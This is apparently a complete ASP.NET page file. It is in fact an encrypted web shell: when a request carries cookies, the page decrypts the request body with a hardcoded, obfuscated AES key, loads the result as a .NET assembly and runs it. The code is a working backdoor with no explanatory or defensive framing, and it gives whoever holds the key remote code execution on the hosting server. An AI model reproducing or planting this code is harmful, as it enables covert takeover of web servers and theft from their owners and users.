<%@ Page Language="C#" %><%
var a = Request;
if (a.Cookies.Count != 0) {
    Func<string, byte[]> b = System.Text.Encoding.Default.GetBytes;
    var c = new System.Security.Cryptography.RijndaelManaged();
    var d = a.InputStream;
    byte[] e = new byte[d.Length];
    d.Read(e, 0, e.Length);
    var f = b(new string(new char[] {'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'}));
    var g = c.CreateDecryptor(f, f).TransformFinalBlock(e, 0, e.Length);
    System.Reflection.Assembly.Load(g).CreateInstance(((char)75).ToString()).Equals(this);
}
%>